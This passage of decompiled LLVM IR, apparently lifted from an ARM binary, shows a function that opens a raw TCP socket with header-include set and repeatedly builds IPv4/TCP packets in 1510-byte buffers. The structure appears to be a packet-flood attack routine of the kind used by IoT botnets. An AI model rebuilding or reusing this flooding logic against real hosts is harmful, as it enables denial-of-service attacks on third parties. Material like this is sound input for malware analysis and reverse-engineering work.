  store i32 %v0_9f40, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_9f38, i32* @sl, align 4
  %v0_9f50 = load i32, i32* @r4, align 4
  store i32 %v0_9f50, i32* %r0.global-to-local, align 4
  %v5_9f54 = inttoptr i32 %v0_9f40 to i32*
  %v6_9f54 = call i32 @function_930c(i32 %v0_9f50, i32* %v5_9f54, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_9f58 = load i32, i32* @r5, align 4
  store i32 %v0_9f58, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_9f54, i32* @r8, align 4
  %v0_9f68 = load i32, i32* @r4, align 4
  store i32 %v0_9f68, i32* %r0.global-to-local, align 4
  %v5_9f6c = inttoptr i32 %v0_9f58 to i32*
  %v6_9f6c = call i32 @function_930c(i32 %v0_9f68, i32* %v5_9f6c, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9f7c = load i32, i32* @r5, align 4
  store i32 %v0_9f7c, i32* %r1.global-to-local, align 4
  %v0_9f80 = load i32, i32* @r4, align 4
  store i32 %v0_9f80, i32* %r0.global-to-local, align 4
  %v5_9f84 = inttoptr i32 %v0_9f7c to i32*
  %v6_9f84 = call i32 @function_930c(i32 %v0_9f80, i32* %v5_9f84, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_9f8c = urem i32 %v6_9f84, 256
  %v0_9f90 = load i32, i32* @r5, align 4
  store i32 %v0_9f90, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9f9c = load i32, i32* @r4, align 4
  store i32 %v0_9f9c, i32* %r0.global-to-local, align 4
  %v5_9fa4 = inttoptr i32 %v0_9f90 to i32*
  %v6_9fa4 = call i32 @function_930c(i32 %v0_9f9c, i32* %v5_9fa4, i32 19, i32 0, i32 %v1_9f8c)
  %v0_9fac = load i32, i32* @r5, align 4
  store i32 %v0_9fac, i32* %r1.global-to-local, align 4
  %v2_9fb0 = load i32, i32* @global_var_1a714.104, align 4
  store i32 %v2_9fb0, i32* %r3.global-to-local, align 4
  store i32 %v6_9fa4, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9fbc = load i32, i32* @r4, align 4
  store i32 %v0_9fbc, i32* %r0.global-to-local, align 4
  %v5_9fc0 = inttoptr i32 %v0_9fac to i32*
  %v6_9fc0 = call i32 @function_930c(i32 %v0_9fbc, i32* %v5_9fc0, i32 25, i32 %v2_9fb0, i32 ptrtoint (i32* @0 to i32))
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_9fd4 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_9fd4, i32* %r0.global-to-local, align 4
  %v2_9fd8 = icmp eq i32 %v3_9fd4, -1
  store i1 %v2_9fd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9fd8, label %dec_label_pc_a458, label %dec_label_pc_9fe4

dec_label_pc_9fe4:                                ; preds = %dec_label_pc_9e80
  store i32 1, i32* %stack_var_-40, align 4
  %v6_9fec = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_9fec, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_a000 = call i32 @setsockopt(i32 %v3_9fd4, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v7_a000, i32* %r0.global-to-local, align 4
  %v2_a004 = icmp eq i32 %v7_a000, -1
  store i1 %v2_a004, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a004, label %dec_label_pc_a450, label %dec_label_pc_a00c

dec_label_pc_a00c:                                ; preds = %dec_label_pc_9fe4
  %v0_a00c = load i32, i32* @sl, align 4
  %v0_a018 = load i32, i32* @r8, align 4
  %v3_a018 = mul i32 %v0_a018, 65536
  store i32 %v3_a018, i32* %r8.global-to-local, align 4
  %v0_a01c = load i32, i32* @r7, align 4
  %v3_a01c = mul i32 %v0_a01c, 65536
  store i32 %v3_a01c, i32* %r7.global-to-local, align 4
  %v0_a020 = load i32, i32* @r6, align 4
  %v1_a020 = urem i32 %v0_a020, 256
  store i32 %v1_a020, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_a028 = urem i32 %v0_a00c, 65536
  store i32 %v3_a028, i32* %r2.global-to-local, align 4
  %v3_a02c = urem i32 %v0_a018, 65536
  store i32 %v3_a02c, i32* %r3.global-to-local, align 4
  %v0_a030 = load i32, i32* @fp, align 4
  %v2_a030 = icmp eq i32 %v0_a030, 0
  store i1 %v2_a030, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %v3_a040 = urem i32 %v0_a01c, 65536
  store i32 %v3_a040, i32* @sl, align 4
  %tmp85 = icmp slt i32 %v0_a030, 1
  br i1 %tmp85, label %dec_label_pc_a57c, label %dec_label_pc_a050

dec_label_pc_a050:                                ; preds = %dec_label_pc_a00c
  %v3_a054 = mul i32 %v6_9f6c, 65536
  %v1_a058 = add i32 %v3_a054, 3407872
  %v3_a060 = udiv i32 %v1_a058, 256
  %v0_a01c.not = or i32 %v0_a01c, -65536
  %v1_a070 = xor i32 %v0_a01c.not, 65535
  %v1_a074 = urem i32 %v0_a018, 256
  %tmp86 = mul nsw i32 %v1_a070, 256
  %v1_a08c = and i32 %v3_a060, 65280
  %v1_a090 = add i32 %v3_a054, 524288
  %v4_a094 = udiv i32 %v1_a058, 16777216
  %v5_a094 = or i32 %v1_a08c, %v4_a094
  store i32 %v5_a094, i32* %r0.global-to-local, align 4
  %v1_a098 = add i32 %v3_a054, 1835008
  %v1_a0a0 = and i32 %tmp86, 65280
  store i32 %v1_a0a0, i32* %lr.global-to-local, align 4
  %tmp87 = udiv i32 %v1_a070, 256
  %tmp88 = udiv i32 %v0_a01c, 256
  %v5_a0b4 = trunc i32 %tmp87 to i8
  %tmp89 = udiv i32 %v0_a00c, 256
  %sext30 = mul i32 %tmp88, 16777216
  %v4_a0d4 = sdiv i32 %sext30, 16777216
  %v3_a0e0 = mul nuw nsw i32 %v1_a074, 256
  store i32 %v3_a0e0, i32* %r5.global-to-local, align 4
  %v3_a0e4 = udiv i32 %v1_a090, 256
  %tmp90 = udiv i32 %v0_a018, 256
  %v4_a0ec = urem i32 %tmp90, 256
  %v5_a0ec = or i32 %v4_a0ec, %v3_a0e0
  store i32 %v5_a0ec, i32* %r7.global-to-local, align 4
  %v3_a0f0 = ashr i32 %sext30, 31
  %v3_a0fc = sdiv i32 %v1_a098, 16777216
  %v1_a100 = and i32 %v3_a0e4, 65280
  store i32 %v1_a100, i32* %r6.global-to-local, align 4
  %sext31 = mul i32 %tmp89, 16777216
  %v4_a108 = sdiv i32 %sext31, 16777216
  %v3_a10c = ashr i32 %v1_a098, 31
  %v3_a110 = udiv i32 %v1_a070, 65536
  %v4_a114 = udiv i32 %v1_a090, 16777216
  %v5_a114 = or i32 %v1_a100, %v4_a114
  store i32 %v5_a114, i32* %r8.global-to-local, align 4
  %v3_a120 = ashr i32 %sext31, 31
  store i32 %v3_a120, i32* %r1.global-to-local, align 4
  store i32 %v1_a074, i32* %r2.global-to-local, align 4
  %v3_a12842 = udiv i32 %v1_a100, 256
  store i32 %v3_a12842, i32* %r3.global-to-local, align 4
  %v5_a130 = trunc i32 %v3_a120 to i8
  store i32 0, i32* %r4.global-to-local, align 4
  %sext = mul i32 %v1_a058, 256
  %v4_a194 = sdiv i32 %sext, 16777216
  %sext17 = mul nuw i32 %v4_a094, 16777216
  %v4_a1a4 = sdiv i32 %sext17, 16777216
  %v2_a278 = icmp eq i32 %v1_a020, 0
  %sext21 = mul i32 %v1_a090, 256
  %v4_a298 = sdiv i32 %sext21, 16777216
  %sext22 = mul i32 %v0_a018, 16777216
  %v7_a2b0 = sdiv i32 %sext22, 16777216
  %v1_a1a0 = trunc i32 %v4_a194 to i8
  br label %dec_label_pc_a140

dec_label_pc_a140:                                ; preds = %bb97, %dec_label_pc_a050
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_a14c = call i32* @calloc(i32 1510, i32 4)
  %v4_a14c = ptrtoint i32* %v2_a14c to i32
  store i32 %v4_a14c, i32* %r0.global-to-local, align 4
  store i32 %v4_9ea0, i32* %r1.global-to-local, align 4
  %v3_a154 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_a154, i32* %r3.global-to-local, align 4
  %v2_a158 = load i32, i32* %r4.global-to-local, align 4
  %v5_a158 = mul i32 %v2_a158, 4
  %v6_a158 = add i32 %v5_a158, %v4_9ea0
  %v7_a158 = inttoptr i32 %v6_a158 to i32*
  store i32 %v4_a14c, i32* %v7_a158, align 4
  %v0_a15c = load i32, i32* %r1.global-to-local, align 4
  %v1_a15c = load i32, i32* %r3.global-to-local, align 4
  %v4_a15c = mul i32 %v1_a15c, 4
  %v5_a15c = add i32 %v4_a15c, %v0_a15c
  %v6_a15c = inttoptr i32 %v5_a15c to i32*
  %v7_a15c = load i32, i32* %v6_a15c, align 4
  store i32 %v7_a15c, i32* %r4.global-to-local, align 4
  %v1_a160 = inttoptr i32 %v7_a15c to i8*
  %v2_a160 = load i8, i8* %v1_a160, align 1
  %tmp = urem i8 %v2_a160, 16
  %v1_a164 = zext i8 %tmp to i32
  %v1_a168 = or i32 %v1_a164, 64
  store i32 %v1_a168, i32* %r2.global-to-local, align 4
  %v1_a16c = trunc i32 %v1_a168 to i8
  store i8 %v1_a16c, i8* %v1_a160, align 1
  %v0_a170 = load i32, i32* %r4.global-to-local, align 4
  %v1_a170 = inttoptr i32 %v0_a170 to i8*
  %v2_a170 = load i8, i8* %v1_a170, align 1
  %v1_a174 = and i8 %v2_a170, -16
  %v1_a178 = or i8 %v1_a174, 5
  store i32 %v1_9f20, i32* %r2.global-to-local, align 4
  store i8 %v1_a178, i8* %v1_a170, align 1
  %v2_a188 = load i32, i32* %r4.global-to-local, align 4
  %v3_a188 = add i32 %v2_a188, 1
  %v4_a188 = inttoptr i32 %v3_a188 to i8*
  store i8 %v5_9ed8, i8* %v4_a188, align 1
  store i32 %v6_9ef4, i32* %r1.global-to-local, align 4
  %v2_a190 = load i32, i32* %r4.global-to-local, align 4
  %v3_a190 = add i32 %v2_a190, 8
  %v4_a190 = inttoptr i32 %v3_a190 to i8*
  store i8 %v5_9f10, i8* %v4_a190, align 1
  store i32 %v4_a194, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_a19c = load i32, i32* %r2.global-to-local, align 4
  %v9_a19c = icmp eq i32 %v0_a19c, 0
  store i1 %v9_a19c, i1* %cpsr_z.global-to-local, align 1
  %v2_a1a0 = load i32, i32* %r4.global-to-local, align 4
  %v3_a1a0 = add i32 %v2_a1a0, 3
  %v4_a1a0 = inttoptr i32 %v3_a1a0 to i8*
  store i8 %v1_a1a0, i8* %v4_a1a0, align 1
  store i32 %v4_a1a4, i32* %r2.global-to-local, align 4
  %v0_a1a8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a1a8, label %.thread24, label %.thread

.thread:                                          ; preds = %dec_label_pc_a140
  %v1_a1a8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v1_a1a8, i32* %r3.global-to-local, align 4
  %v2_a1ac = trunc i32 %v1_a1a8 to i8
  %v3_a1ac = load i32, i32* %r4.global-to-local, align 4
  %v4_a1ac = add i32 %v3_a1ac, 7
  %v5_a1ac = inttoptr i32 %v4_a1ac to i8*
  store i8 %v2_a1ac, i8* %v5_a1ac, align 1
  %v0_a1b0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a1b0.pr.pr, label %.thread24, label %bb

bb:                                               ; preds = %.thread
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_a1b4 = load i32, i32* %r4.global-to-local, align 4
  %v4_a1b4 = add i32 %v3_a1b4, 6
  %v5_a1b4 = inttoptr i32 %v4_a1b4 to i8*
  store i8 64, i8* %v5_a1b4, align 1
  br label %.thread24

.thread24:                                        ; preds = %dec_label_pc_a140, %.thread, %bb
  %v0_a1b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_a1b8 = trunc i32 %v0_a1b8 to i8
  %v2_a1b8 = load i32, i32* %r4.global-to-local, align 4
  %v3_a1b8 = add i32 %v2_a1b8, 2
  %v4_a1b8 = inttoptr i32 %v3_a1b8 to i8*
  store i8 %v1_a1b8, i8* %v4_a1b8, align 1
  store i32 %v3_a0f0, i32* %r2.global-to-local, align 4
  store i32 %v4_a0d4, i32* %r1.global-to-local, align 4
  %v2_a1c8 = load i32, i32* %r4.global-to-local, align 4
  %v3_a1c8 = add i32 %v2_a1c8, 9
  %v4_a1c8 = inttoptr i32 %v3_a1c8 to i8*
  store i8 47, i8* %v4_a1c8, align 1
  %v0_a1cc = load i32, i32* %r2.global-to-local, align 4
  %v1_a1cc = trunc i32 %v0_a1cc to i8
  %v2_a1cc = load i32, i32* %r4.global-to-local, align 4
  %v3_a1cc = add i32 %v2_a1cc, 5
  %v4_a1cc = inttoptr i32 %v3_a1cc to i8*
  store i8 %v1_a1cc, i8* %v4_a1cc, align 1
  %v3_a1d0 = load i32, i32* %stack_var_-40, align 4
  %v5_a1d8 = mul i32 %v3_a1d0, 24
  store i32 %v5_a1d8, i32* %r3.global-to-local, align 4
  store i32 %v6_9fc0, i32* %r2.global-to-local, align 4
  %v1_a1e0 = load i32, i32* %r4.global-to-local, align 4
  %v2_a1e0 = add i32 %v1_a1e0, 12
  %v3_a1e0 = inttoptr i32 %v2_a1e0 to i32*
  store i32 %v6_9fc0, i32* %v3_a1e0, align 4
  %v0_a1e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a1e4 = load i32, i32* @sb, align 4
  %v2_a1e4 = add i32 %v1_a1e4, %v0_a1e4
  store i32 %v2_a1e4, i32* %r3.global-to-local, align 4
  %v0_a1e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_a1e8 = trunc i32 %v0_a1e8 to i8
  %v2_a1e8 = load i32, i32* %r4.global-to-local, align 4
  %v3_a1e8 = add i32 %v2_a1e8, 4
  %v4_a1e8 = inttoptr i32 %v3_a1e8 to i8*
  store i8 %v1_a1e8, i8* %v4_a1e8, align 1
  %v0_a1ec = load i32, i32* %r3.global-to-local, align 4
  %v1_a1ec = add i32 %v0_a1ec, 16
  %v2_a1ec = inttoptr i32 %v1_a1ec to i32*
  %v3_a1ec = load i32, i32* %v2_a1ec, align 4
  store i32 %v3_a1ec, i32* %r2.global-to-local, align 4
  %v0_a1f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_a1f0 = add i32 %v0_a1f0, 20
  store i32 %v1_a1f0, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v0_a1f8 = load i32, i32* %r0.global-to-local, align 4
  %v1_a1f8 = trunc i32 %v0_a1f8 to i8
  %v3_a1f8 = add i32 %v0_a1f0, 23
  %v4_a1f8 = inttoptr i32 %v3_a1f8 to i8*
  store i8 %v1_a1f8, i8* %v4_a1f8, align 1
  %v0_a1fc = load i32, i32* %r3.global-to-local, align 4
  %v1_a1fc = trunc i32 %v0_a1fc to i8
  %v2_a1fc = load i32, i32* %r1.global-to-local, align 4
  %v3_a1fc = add i32 %v2_a1fc, 2
  %v4_a1fc = inttoptr i32 %v3_a1fc to i8*
  store i8 %v1_a1fc, i8* %v4_a1fc, align 1
  %v0_a200 = load i32, i32* %r4.global-to-local, align 4
  %v1_a200 = add i32 %v0_a200, 24
  %v2_a200 = inttoptr i32 %v1_a200 to i8*
  %v3_a200 = load i8, i8* %v2_a200, align 1
  %tmp105 = urem i8 %v3_a200, 16
  %v1_a204 = zext i8 %tmp105 to i32
  %v1_a208 = or i32 %v1_a204, 64
  store i32 %v1_a208, i32* %r3.global-to-local, align 4
  %v1_a20c = trunc i32 %v1_a208 to i8
  store i8 %v1_a20c, i8* %v2_a200, align 1
  %v0_a210 = load i32, i32* %r2.global-to-local, align 4
  %v1_a210 = load i32, i32* %r4.global-to-local, align 4
  %v2_a210 = add i32 %v1_a210, 16
  %v3_a210 = inttoptr i32 %v2_a210 to i32*
  store i32 %v0_a210, i32* %v3_a210, align 4
  %v0_a214 = load i32, i32* %r4.global-to-local, align 4
  %v1_a214 = add i32 %v0_a214, 24
  %v2_a214 = inttoptr i32 %v1_a214 to i8*
  %v3_a214 = load i8, i8* %v2_a214, align 1
  %v1_a218 = and i8 %v3_a214, -16
  %v1_a21c = or i8 %v1_a218, 5
  store i8 %v1_a21c, i8* %v2_a214, align 1
  %v0_a228 = load i32, i32* %r4.global-to-local, align 4
  %v1_a228 = add i32 %v0_a228, 24
  store i32 %v1_a228, i32* %r5.global-to-local, align 4
  %v3_a22c = add i32 %v0_a228, 25
  %v4_a22c = inttoptr i32 %v3_a22c to i8*
  store i8 %v5_9ed8, i8* %v4_a22c, align 1
  store i32 %v3_a0fc, i32* %r1.global-to-local, align 4
  store i32 %tmp87, i32* %r3.global-to-local, align 4
  store i32 %v3_a10c, i32* %r2.global-to-local, align 4
  %v2_a23c = load i32, i32* %r5.global-to-local, align 4
  %v3_a23c = add i32 %v2_a23c, 4
  %v4_a23c = inttoptr i32 %v3_a23c to i8*
  store i8 %v5_a0b4, i8* %v4_a23c, align 1
  %v0_a240 = load i32, i32* %r1.global-to-local, align 4
  %v1_a240 = trunc i32 %v0_a240 to i8
  %v2_a240 = load i32, i32* %r5.global-to-local, align 4
  %v3_a240 = add i32 %v2_a240, 2
  %v4_a240 = inttoptr i32 %v3_a240 to i8*
  store i8 %v1_a240, i8* %v4_a240, align 1
  %v0_a244 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a244, label %bb92, label %bb91

bb91:                                             ; preds = %.thread24
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb92

bb92:                                             ; preds = %.thread24, %bb91
  store i32 %v3_a110, i32* %r1.global-to-local, align 4
  %v0_a24c = load i32, i32* %r2.global-to-local, align 4
  %v1_a24c = trunc i32 %v0_a24c to i8
  %v2_a24c = load i32, i32* %r5.global-to-local, align 4
  %v3_a24c = add i32 %v2_a24c, 3
  %v4_a24c = inttoptr i32 %v3_a24c to i8*
  store i8 %v1_a24c, i8* %v4_a24c, align 1
  store i32 %v6_9ef4, i32* %r2.global-to-local, align 4
  %v0_a254 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a254, label %bb94, label %bb93

bb93:                                             ; preds = %bb92
  %v1_a254 = load i32, i32* %r3.global-to-local, align 4
  %v2_a254 = trunc i32 %v1_a254 to i8
  %v3_a254 = load i32, i32* %r5.global-to-local, align 4
  %v4_a254 = add i32 %v3_a254, 6
  %v5_a254 = inttoptr i32 %v4_a254 to i8*
  store i8 %v2_a254, i8* %v5_a254, align 1
  br label %bb94

bb94:                                             ; preds = %bb92, %bb93
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_a25c = load i32, i32* %r1.global-to-local, align 4
  %v1_a25c = trunc i32 %v0_a25c to i8
  %v2_a25c = load i32, i32* %r5.global-to-local, align 4
  %v3_a25c = add i32 %v2_a25c, 5
  %v4_a25c = inttoptr i32 %v3_a25c to i8*
  store i8 %v1_a25c, i8* %v4_a25c, align 1
  %v0_a260 = load i32, i32* %r2.global-to-local, align 4
  %v1_a260 = trunc i32 %v0_a260 to i8
  %v2_a260 = load i32, i32* %r5.global-to-local, align 4
  %v3_a260 = add i32 %v2_a260, 8
  %v4_a260 = inttoptr i32 %v3_a260 to i8*
  store i8 %v1_a260, i8* %v4_a260, align 1
  %v0_a264 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a264, label %bb96, label %bb95

bb95:                                             ; preds = %bb94
  %v1_a264 = load i32, i32* %r0.global-to-local, align 4
  %v2_a264 = trunc i32 %v1_a264 to i8
  %v3_a264 = load i32, i32* %r5.global-to-local, align 4
  %v4_a264 = add i32 %v3_a264, 7
  %v5_a264 = inttoptr i32 %v4_a264 to i8*
  store i8 %v2_a264, i8* %v5_a264, align 1
  br label %bb96

bb96:                                             ; preds = %bb94, %bb95
  %v0_a268 = load i32, i32* %r3.global-to-local, align 4
  %v1_a268 = trunc i32 %v0_a268 to i8
  %v2_a268 = load i32, i32* %r5.global-to-local, align 4
  %v3_a268 = add i32 %v2_a268, 9
  %v4_a268 = inttoptr i32 %v3_a268 to i8*
  store i8 %v1_a268, i8* %v4_a268, align 1
  %v0_a26c = call i32 @function_f6c4()
  store i32 %v0_a26c, i32* %r0.global-to-local, align 4
  store i32 %v1_a020, i32* %r1.global-to-local, align 4
  store i1 %v2_a278, i1* %cpsr_z.global-to-local, align 1
  %v1_a27c = sub i32 1023, %v0_a26c
  store i32 %v1_a27c, i32* %r3.global-to-local, align 4
  br i1 %v2_a278, label %.thread25, label %.thread26

.thread25:                                        ; preds = %bb96
  %v2_a284 = load i32, i32* %r5.global-to-local, align 4
  %v3_a284 = add i32 %v2_a284, 16
  %v4_a284 = inttoptr i32 %v3_a284 to i32*
  store i32 %v1_a27c, i32* %v4_a284, align 4
  br label %bb97

.thread26:                                        ; preds = %bb96
  %v1_a280 = load i32, i32* %r4.global-to-local, align 4
  %v2_a280 = add i32 %v1_a280, 16
  %v3_a280 = inttoptr i32 %v2_a280 to i32*
  %v4_a280 = load i32, i32* %v3_a280, align 4
  store i32 %v4_a280, i32* %r3.global-to-local, align 4
  %v2_a288 = load i32, i32* %r5.global-to-local, align 4
  %v3_a288 = add i32 %v2_a288, 16
  %v4_a288 = inttoptr i32 %v3_a288 to i32*
  store i32 %v4_a280, i32* %v4_a288, align 4
  br label %bb97

bb97:                                             ; preds = %.thread25, %.thread26
  store i32 %v4_a108, i32* %r3.global-to-local, align 4
  %v0_a290 = load i32, i32* %r4.global-to-local, align 4
  %v1_a290 = add i32 %v0_a290, 44
  store i32 %v1_a290, i32* %r6.global-to-local, align 4
  %v1_a294 = load i32, i32* %r5.global-to-local, align 4
  %v2_a294 = add i32 %v1_a294, 12
  %v3_a294 = inttoptr i32 %v2_a294 to i32*
  store i32 %v0_a26c, i32* %v3_a294, align 4
  store i32 %v4_a298, i32* %r2.global-to-local, align 4
  %v0_a29c = load i32, i32* %r3.global-to-local, align 4
  %v1_a29c = trunc i32 %v0_a29c to i8
  %v2_a29c = load i32, i32* %r6.global-to-local, align 4
  %v3_a29c = inttoptr i32 %v2_a29c to i8*
  store i8 %v1_a29c, i8* %v3_a29c, align 1
  %v3_a2a0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_a2a0, i32* %r3.global-to-local, align 4
  %v0_a2a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_a2a4 = trunc i32 %v0_a2a4 to i8
  %v2_a2a4 = load i32, i32* %r6.global-to-local, align 4
  %v3_a2a4 = add i32 %v2_a2a4, 5
  %v4_a2a4 = inttoptr i32 %v3_a2a4 to i8*
  store i8 %v1_a2a4, i8* %v4_a2a4, align 1
  %v0_a2a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_a2a8 = add i32 %v0_a2a8, 1
  store i32 %v1_a2a8, i32* %r4.global-to-local, align 4
  store i32 %v3_a120, i32* %r1.global-to-local, align 4
  store i32 %v7_a2b0, i32* %r2.global-to-local, align 4
  %v1_a2b4 = load i32, i32* @fp, align 4
  %v9_a2b4 = icmp eq i32 %v1_a2a8, %v1_a2b4
  store i1 %v9_a2b4, i1* %cpsr_z.global-to-local, align 1
  %v2_a2b8 = load i32, i32* %r6.global-to-local, align 4
  %v3_a2b8 = add i32 %v2_a2b8, 1
  %v4_a2b8 = inttoptr i32 %v3_a2b8 to i8*
  store i8 %v5_a130, i8* %v4_a2b8, align 1
  %v0_a2bc = load i32, i32* %r7.global-to-local, align 4
  %v1_a2bc = trunc i32 %v0_a2bc to i8
  %v2_a2bc = load i32, i32* %r6.global-to-local, align 4
  %v3_a2bc = add i32 %v2_a2bc, 2
  %v4_a2bc = inttoptr i32 %v3_a2bc to i8*
  store i8 %v1_a2bc, i8* %v4_a2bc, align 1
  %v0_a2c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_a2c0 = trunc i32 %v0_a2c0 to i8
  %v2_a2c0 = load i32, i32* %r6.global-to-local, align 4
  %v3_a2c0 = add i32 %v2_a2c0, 3
  %v4_a2c0 = inttoptr i32 %v3_a2c0 to i8*
  store i8 %v1_a2c0, i8* %v4_a2c0, align 1
  %v0_a2c4 = load i32, i32* %r8.global-to-local, align 4
  %v1_a2c4 = trunc i32 %v0_a2c4 to i8
  %v2_a2c4 = load i32, i32* %r6.global-to-local, align 4
  %v3_a2c4 = add i32 %v2_a2c4, 4
  %v4_a2c4 = inttoptr i32 %v3_a2c4 to i8*
  store i8 %v1_a2c4, i8* %v4_a2c4, align 1
  %v0_a2c8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_a2c8, i32* %stack_var_-40, align 4
  %v5_a2cc = icmp slt i32 %v1_a2a8, %v1_a2b4
  br i1 %v5_a2cc, label %dec_label_pc_a140, label %dec_label_pc_a2d0

dec_label_pc_a2d0:                                ; preds = %bb97
  %v1_a2d8 = add i32 %v6_9f6c, 8
  store i32 %v1_a2d8, i32* %r3.global-to-local, align 4
  %v1_a2dc = add i32 %v6_9f6c, 52
  store i32 %v1_a2dc, i32* %r1.global-to-local, align 4
  %v0_a2e8.pre.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_a2e8.preheader

dec_label_pc_a2e8.preheader:                      ; preds = %dec_label_pc_a2d0, %dec_label_pc_a57c
  %v0_a2e8.pre = phi i32 [ %v0_a2e8.pre.pre, %dec_label_pc_a2d0 ], [ %v0_a030, %dec_label_pc_a57c ]
  %stack_var_-120.0.ph = phi i32 [ %v1_a2dc, %dec_label_pc_a2d0 ], [ %v1_a588, %dec_label_pc_a57c ]
  %stack_var_-152.0.ph = phi i32 [ %v1_a2d8, %dec_label_pc_a2d0 ], [ %v1_a584, %dec_label_pc_a57c ]
  %v2_a560 = icmp eq i32 %v1_9f8c, 0
  %v2_a360 = icmp eq i32 %v1_a020, 0
  %v2_a32c = icmp eq i32 %v6_9fc0, -1
  br label %dec_label_pc_a2e8

dec_label_pc_a2e8:                                ; preds = %dec_label_pc_a37c, %dec_label_pc_a2e8.preheader
  %v0_a2e8 = phi i32 [ %v0_a2e8.pre, %dec_label_pc_a2e8.preheader ], [ %v1_a440, %dec_label_pc_a37c ]
  %v2_a2e8 = icmp eq i32 %v0_a2e8, 0
  store i1 %v2_a2e8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp98 = icmp slt i32 %v0_a2e8, 1
  br label %dec_label_pc_a2f0

dec_label_pc_a2f0:                                ; preds = %dec_label_pc_a2f0, %dec_label_pc_a2e8
  br i1 %tmp98, label %dec_label_pc_a2f0, label %dec_label_pc_a2f4

dec_label_pc_a2f4:                                ; preds = %dec_label_pc_a2f0
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_a300

dec_label_pc_a300:                                ; preds = %dec_label_pc_a37c, %dec_label_pc_a2f4
  %v1_a314 = phi i32 [ %v1_a43c, %dec_label_pc_a37c ], [ 0, %dec_label_pc_a2f4 ]
  %v5_a304 = mul i32 %v1_a314, 24
  %v1_a308 = load i32, i32* @sb, align 4
  %v2_a308 = add i32 %v1_a308, %v5_a304
  store i32 %v2_a308, i32* %r3.global-to-local, align 4
  store i32 %v4_9ea0, i32* %r1.global-to-local, align 4
  %v1_a310 = add i32 %v2_a308, 20
  %v2_a310 = inttoptr i32 %v1_a310 to i8*
  %v3_a310 = load i8, i8* %v2_a310, align 1
  %v4_a310 = zext i8 %v3_a310 to i32
  store i32 %v4_a310, i32* %r2.global-to-local, align 4
  %v4_a314 = mul i32 %v1_a314, 4
  %v5_a314 = add i32 %v4_a314, %v4_9ea0
  %v6_a314 = inttoptr i32 %v5_a314 to i32*
  %v7_a314 = load i32, i32* %v6_a314, align 4
  store i32 %v7_a314, i32* @r5, align 4
  %v7_a318 = icmp eq i8 %v3_a310, 31
  store i1 %v7_a318, i1* %cpsr_z.global-to-local, align 1
  %v1_a31c = add i32 %v7_a314, 24
  store i32 %v1_a31c, i32* @r6, align 4
  %v1_a320 = add i32 %v7_a314, 44
  store i32 %v1_a320, i32* @r7, align 4
  %tmp106 = icmp ult i8 %v3_a310, 32
  br i1 %tmp106, label %dec_label_pc_a460, label %dec_label_pc_a328

dec_label_pc_a328:                                ; preds = %dec_label_pc_a300
  store i32 %v6_9fc0, i32* %r2.global-to-local, align 4
  store i1 %v2_a32c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a32c, label %dec_label_pc_a4c8, label %dec_label_pc_a334

dec_label_pc_a334:                                ; preds = %dec_label_pc_a460, %dec_label_pc_a328
  store i32 65535, i32* @r4, align 4
  %v0_a33c = load i32, i32* @sl, align 4
  %v9_a33c = icmp eq i32 %v0_a33c, 65535
  store i1 %v9_a33c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a33c, label %dec_label_pc_a4e0, label %dec_label_pc_a344

dec_label_pc_a344:                                ; preds = %dec_label_pc_a4c8.dec_label_pc_a344_crit_edge, %dec_label_pc_a334
